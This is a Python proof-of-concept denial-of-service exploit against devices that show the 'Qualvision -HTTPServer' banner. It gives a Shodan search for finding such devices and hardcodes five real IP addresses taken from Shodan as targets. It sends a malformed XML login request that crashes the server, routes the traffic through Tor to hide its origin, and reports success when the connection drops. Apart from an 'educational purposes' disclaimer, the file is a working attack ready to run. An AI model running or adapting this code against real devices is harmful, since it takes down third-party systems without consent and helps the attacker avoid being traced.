#!/usr/bin/env python3

############################### DoS Exploit (PoC) for Qualvision -HTTPServer [By R3DRUN3] ###############################
#    First draft timestamp: 5/16/2022 10:21:32 AM                                                                       #
#    Shodan.io dork for finding vulnerable Devices: https://www.shodan.io/search?query=%22Qualvision+-HTTPServer%22     #
#########################################################################################################################

###### DISCLAIMER #####################################################
# PLEASE NOTE: THIS EXPLOIT IS PURELY FOR EDUCATIONAL PURPOSES        #
# NEVER USE AGAINST SYSTEMS FOR WHICH YOU HAVE NOT BEEN GIVEN CONSENT #
#######################################################################


###### EXPLOIT EXPLANATION ############################################################################################ 
#                                                                                                                     #      
#      It is possible to create a Denial of service against systems that presents the banner "Qualvision -HTTPServer" #
#      by submitting an HTTP POST request with a slightly modified payload.                                           #
#                                                                                                                     #                         
#      The system expects the presence of the '<username>' and '<password>' XML nodes in the payload                  #
#      but removing them cause the server to crash: it becomes unreachable on the application layer                   #
#      and active legitimate sessions are closed.                                                                     #
#                                                                                                                     #
#      There does not seem to be a CVE census in this regard, therefore it could be a zero-day vulnerability.         #
#                                                                                                                     #
#      Details on the software versions involved are not known but for now all tested devices seem vulnerable.        #
#                                                                                                                     #
#######################################################################################################################

import requests
import json

TARGETS = ['81.3.191.194', '91.107.9.81', '84.47.165.182', '31.192.148.232', '2.186.243.250'] #just some targets found on Shodan.io

def get_tor_session():
    session = requests.session()
    session.proxies = {'http':  'socks5://127.0.0.1:9050',
                       'https': 'socks5://127.0.0.1:9050'}
    return session

if __name__ == "__main__":
  print("\n########## STARTING EXPLOIT ==> SENDING REQUESTS THROUGH ToR NETWORK ##########\n\n")
  session = get_tor_session()
  print(f"Exit ToR node is: {json.loads(session.get('http://httpbin.org/ip').text)['origin']}")

  for t in TARGETS:
    url = f'http://{t}/tdkcgi'
    payload = "<?xml version='1.0' encoding='utf-8'?>\n<envelope><header><security>username</security></header><body><command>get.system.login</command><content></content></body></envelope>"
    headers = {
      'Accept-Language': 'en-US,en;q=0.5',
      'Accept': '*/*',
      'Accept-Encoding': 'gzip, deflate',
      'Referer': f'http://{t}/index.html',
      'Connection': 'Close',
      'Host': f'{t}',
      'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
      'Content-Type': 'application/xml;charset=UTF-8',
      'Content-Length': '220',
      'Origin': f'http://{t}',
      'DNT': '1',
      'Cookie': '_goaheadwebSessionId=1653323156817220_389847650_644209849'
    }
    try:
      response = session.post(url, data=payload, headers=headers, allow_redirects=True, verify=False)
    except Exception as e:
      if "'Connection aborted.', RemoteDisconnected" in str(e):
        print(f"Exploit completed succesfully against target {t}\n")